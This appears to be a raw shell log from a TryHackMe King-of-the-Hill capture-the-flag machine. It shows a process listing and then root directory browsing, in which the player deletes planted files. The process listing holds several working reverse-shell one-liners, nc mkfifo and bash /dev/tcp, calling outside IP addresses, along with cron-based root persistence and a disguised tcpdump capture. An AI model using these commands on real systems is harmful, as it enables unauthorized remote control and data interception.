bread    12201   772  0 17:45 ?        00:00:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.100.118 1234 >/tmp/f
bread    12205 12201  0 17:45 ?        00:00:00      \_ cat /tmp/f
root       773     1  0 17:16 ?        00:00:00 /root/koth
tryhack+   776     1  0 17:16 ?        00:00:00 /home/tryhackme/img
root       777     1  0 17:16 ?        00:00:00 /lib/systemd/systemd-logind
root       780     1  0 17:16 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
daemon     783     1  0 17:16 ?        00:00:00 /usr/sbin/atd -f
root       784     1  0 17:16 ?        00:00:10 /usr/lib/snapd/snapd
root       785     1  0 17:16 ?        00:00:00 /usr/sbin/cron -f
root      5307   785  0 17:26 ?        00:00:00  \_ /usr/sbin/CRON -f
root      5308  5307  0 17:26 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      5309  5308  0 17:26 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      5310  5309  0 17:26 ?        00:00:00  |           \_ bash -i
root      8458   785  0 17:34 ?        00:00:00  \_ /usr/sbin/CRON -f
root      8459  8458  0 17:34 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root      8460  8459  0 17:34 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root      8461  8460  0 17:34 ?        00:00:00  |           \_ bash -i
root     13826   785  0 17:51 ?        00:00:00  \_ /usr/sbin/CRON -f
root     13827 13826  0 17:51 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root     13828 13827  0 17:51 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root     13829 13828  0 17:51 ?        00:00:00  |           \_ bash -i
root     14440   785  0 17:53 ?        00:00:00  \_ /usr/sbin/CRON -f
root     14441 14440  0 17:53 ?        00:00:00  |   \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root     14442 14441  0 17:53 ?        00:00:00  |       \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root     14443 14442  0 17:53 ?        00:00:00  |           \_ bash -i
root     15055   785  0 17:55 ?        00:00:00  \_ /usr/sbin/CRON -f
root     15056 15055  0 17:55 ?        00:00:00      \_ /bin/sh -c bash -c "bash -i >& /dev/tcp/10.8.162.106/9000 0>&1"
root     15057 15056  0 17:55 ?        00:00:00          \_ bash -c bash -i >& /dev/tcp/10.8.162.106/9000 0>&1
root     15058 15057  0 17:55 ?        00:00:00              \_ bash -i
root       806     1  0 17:16 ttyS0    00:00:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       819     1  0 17:16 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       822     1  0 17:16 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       833     1  0 17:16 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      853     1  0 17:16 ?        00:00:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen     1178     1  0 17:17 ?        00:00:00 /lib/systemd/systemd --user
ramen     1183  1178  0 17:17 ?        00:00:00  \_ (sd-pam)
root      2723     1  0 17:20 ?        00:00:00 sshd: ramen [priv]
ramen     2792  2723  0 17:20 ?        00:00:00  \_ sshd: ramen@pts/0
ramen     2793  2792  0 17:20 pts/0    00:00:00      \_ -bash
root      3850  2793  0 17:23 pts/0    00:00:00          \_ -i
root      4108  3850  0 17:24 pts/0    00:00:00              \_ tcpdump -i any -w /tmp/.systemd-font-89f032hf9032
root        45     1  0 17:24 ?        00:00:00 /lib/sy
root      4553     1  0 17:24 ?        00:00:00 /usr/sbin/sshd -D
root      6873     1  0 17:28 ?        00:00:00 /bin/bash -c bash -i >& /dev/tcp/10.11.55.164/3737 0>&1
root      6882  6873  0 17:28 ?        00:00:00  \_ bash -i
root     15104  6882  0 17:55 ?        00:00:00      \_ ps -eaf --forest
root      7192     1  4 17:29 ?        00:01:10 /li
root     10032     1  0 17:38 pts/0    00:00:00 systemd-pam
root@foodctf:~# ls -oa
ls -oa
total 7260
drwx------  4 root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root      38 Mar 28  2020 flag
-r--r--r--  1 root      11 Nov  5 17:55 king.txt
-rwxr-xr-x  1 root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root    4096 Mar 19  2020 .local
-rw-------  1 root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root     206 Mar 28  2020 .profile
drwx------  2 root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# cd /var
cd /var
root@foodctf:/var# ls -la
ls -la
total 56
drwxr-xr-x 13 root root   4096 Nov  5 17:18 .
drwxr-xr-x 24 root root   4096 Mar 19  2020 ..
drwxr-xr-x  2 root root   4096 Mar 20  2020 backups
drwxr-xr-x 10 root root   4096 Mar 19  2020 cache
drwxrwxrwt  2 root root   4096 Nov  5 17:29 crash
-rw-r--r--  1 root root     38 Mar 28  2020 flag.txt
drwxr-xr-x 41 root root   4096 Mar 20  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  5  2019 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Mar 30  2020 log
drwxrwsr-x  2 root mail   4096 Aug  5  2019 mail
drwxr-xr-x  2 root root   4096 Aug  5  2019 opt
lrwxrwxrwx  1 root root      4 Aug  5  2019 run -> /run
drwxr-xr-x  3 root root   4096 Mar 19  2020 snap
drwxr-xr-x  4 root root   4096 Aug  5  2019 spool
drwxrwxrwt  5 root root   4096 Nov  5 17:18 tmp
root@foodctf:/var# cd /var/tmp
cd /var/tmp
root@foodctf:/var/tmp# l..s -la
l..s -la

Command 'l..s' not found, did you mean:

  command 'les' from deb atm-tools
  command 'lvs' from deb lvm2
  command 'ls' from deb coreutils
  command 'lrs' from deb lrslib

Try: apt install <deb name>

root@foodctf:/var/tmp# ls -la
ls -la
total 20
drwxrwxrwt  5 root root 4096 Nov  5 17:18 .
drwxr-xr-x 13 root root 4096 Nov  5 17:18 ..
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
drwxrwxr-x  2 root root 4096 Nov  5 17:20 .tmp
root@foodctf:/var/tmp# cd .tmp
cd .tmp
root@foodctf:/var/tmp/.tmp# ls -la
ls -la
total 1512
drwxrwxr-x 2 root root   4096 Nov  5 17:20 .
drwxrwxrwt 5 root root   4096 Nov  5 17:18 ..
-rwxrwxr-x 1 root root 762816 Dec 22  2022 c
-rw-rw-r-- 1 root root 762816 Dec 22  2022 c.1
-rw-rw-r-- 1 root root    235 Oct 29 19:19 https.service
-rw-rw-r-- 1 root root    235 Oct 29 19:19 kothh.service
root@foodctf:/var/tmp/.tmp# cd ..
cd ..
root@foodctf:/var/tmp# ls -la -R
ls -la -R
.:
total 20
drwxrwxrwt  5 root root 4096 Nov  5 17:18 .
drwxr-xr-x 13 root root 4096 Nov  5 17:18 ..
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
drwxrwxr-x  2 root root 4096 Nov  5 17:20 .tmp

./systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v:
total 12
drwx------ 3 root root 4096 Nov  5 17:16 .
drwxrwxrwt 5 root root 4096 Nov  5 17:18 ..
drwxrwxrwt 2 root root 4096 Nov  5 17:16 tmp

./systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v/tmp:
total 8
drwxrwxrwt 2 root root 4096 Nov  5 17:16 .
drwx------ 3 root root 4096 Nov  5 17:16 ..

./systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea:
total 12
drwx------ 3 root root 4096 Nov  5 17:16 .
drwxrwxrwt 5 root root 4096 Nov  5 17:18 ..
drwxrwxrwt 2 root root 4096 Nov  5 17:16 tmp

./systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea/tmp:
total 8
drwxrwxrwt 2 root root 4096 Nov  5 17:16 .
drwx------ 3 root root 4096 Nov  5 17:16 ..

./.tmp:
total 1512
drwxrwxr-x 2 root root   4096 Nov  5 17:20 .
drwxrwxrwt 5 root root   4096 Nov  5 17:18 ..
-rwxrwxr-x 1 root root 762816 Dec 22  2022 c
-rw-rw-r-- 1 root root 762816 Dec 22  2022 c.1
-rw-rw-r-- 1 root root    235 Oct 29 19:19 https.service
-rw-rw-r-- 1 root root    235 Oct 29 19:19 kothh.service
root@foodctf:/var/tmp# 

root@foodctf:/var/tmp# cd tmp
cd tmp
bash: cd: tmp: No such file or directory
root@foodctf:/var/tmp# ls -la
ls -la
total 20
drwxrwxrwt  5 root root 4096 Nov  5 17:18 .
drwxr-xr-x 13 root root 4096 Nov  5 17:18 ..
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
drwxrwxr-x  2 root root 4096 Nov  5 17:20 .tmp
root@foodctf:/var/tmp# cd .tmp
cd .tmp
root@foodctf:/var/tmp/.tmp# ls -la
ls -la
total 1512
drwxrwxr-x 2 root root   4096 Nov  5 17:20 .
drwxrwxrwt 5 root root   4096 Nov  5 17:18 ..
-rwxrwxr-x 1 root root 762816 Dec 22  2022 c
-rw-rw-r-- 1 root root 762816 Dec 22  2022 c.1
-rw-rw-r-- 1 root root    235 Oct 29 19:19 https.service
-rw-rw-r-- 1 root root    235 Oct 29 19:19 kothh.service
root@foodctf:/var/tmp/.tmp# rm *
rm *
root@foodctf:/var/tmp/.tmp# cd ..
cd ..
root@foodctf:/var/tmp# ls
ls
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
root@foodctf:/var/tmp# cd systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v

<e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
<999087a16f3c6dfc3-systemd-resolved.service-tTMf5v# ls -la
ls -la
total 12
drwx------ 3 root root 4096 Nov  5 17:16 .
drwxrwxrwt 5 root root 4096 Nov  5 17:18 ..
drwxrwxrwt 2 root root 4096 Nov  5 17:16 tmp
<999087a16f3c6dfc3-systemd-resolved.service-tTMf5v# cd tmp
cd tmp
<87a16f3c6dfc3-systemd-resolved.service-tTMf5v/tmp# ls -la
ls -la
total 8
drwxrwxrwt 2 root root 4096 Nov  5 17:16 .
drwx------ 3 root root 4096 Nov  5 17:16 ..
<87a16f3c6dfc3-systemd-resolved.service-tTMf5v/tmp# cd ..
cd ..
<999087a16f3c6dfc3-systemd-resolved.service-tTMf5v# cd ..
cd ..
root@foodctf:/var/tmp# ls -la
ls -la
total 20
drwxrwxrwt  5 root root 4096 Nov  5 17:18 .
drwxr-xr-x 13 root root 4096 Nov  5 17:18 ..
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-tTMf5v
drwx------  3 root root 4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
drwxrwxr-x  2 root root 4096 Nov  5 17:55 .tmp
root@foodctf:/var/tmp# cd systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea

<4999087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea
<99087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea# ls -la
ls -la
total 12
drwx------ 3 root root 4096 Nov  5 17:16 .
drwxrwxrwt 5 root root 4096 Nov  5 17:18 ..
drwxrwxrwt 2 root root 4096 Nov  5 17:16 tmp
<99087a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea# cd tmp
cd tmp
<7a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea/tmp# ls -la
ls -la
total 8
drwxrwxrwt 2 root root 4096 Nov  5 17:16 .
drwx------ 3 root root 4096 Nov  5 17:16 ..
<7a16f3c6dfc3-systemd-timesyncd.service-m1j2Ea/tmp# cd
cd
root@foodctf:~# ls -la
ls -la
total 7260
drwx------  4 root root    4096 Nov  5 17:19 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Nov  5 17:19 .bash_history -> /dev/null
-rw-r--r--  1 root root    3412 Nov  5 17:24 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Nov  5 17:55 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Nov  5 17:18 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
root@foodctf:~# 